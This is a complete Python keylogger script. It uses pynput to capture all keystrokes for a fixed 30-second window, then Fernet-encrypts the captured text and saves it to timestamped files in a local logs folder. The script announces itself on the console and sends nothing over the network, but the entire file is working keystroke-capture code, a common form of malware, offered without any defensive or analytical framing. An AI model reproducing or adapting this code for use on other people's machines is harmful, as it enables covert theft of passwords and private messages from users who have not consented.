import os
import time
from datetime import datetime
from pynput import keyboard
from cryptography.fernet import Fernet

class Keylogger:
    def __init__(self):
        self.log = ""
        self.start_time = time.time()
        self.duration = 30  # seconds

        key_path = "secret.key"
        if not os.path.exists(key_path):
            key = Fernet.generate_key()
            with open(key_path, "wb") as f:
                f.write(key)
        else:
            with open(key_path, "rb") as f:
                key = f.read()
        self.fernet = Fernet(key)

        if not os.path.exists("logs"):
            os.makedirs("logs")

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            else:
                self.log += f"[{key.name}]"

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            print(f"[+] Keylogger started for {self.duration} seconds...")
            while time.time() - self.start_time < self.duration:
                time.sleep(0.1)
            listener.stop()
            print("[*] Keylogger stopped.")

        self.save_log()

    def save_log(self):
        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"logs/log_{now}.txt"
        encrypted_data = self.fernet.encrypt(self.log.encode())
        with open(filename, "wb") as f:
            f.write(encrypted_data)
        print(f"[+] Log saved to {filename}")

def main():
    logger = Keylogger()
    logger.start()

if __name__ == "__main__":
    main()
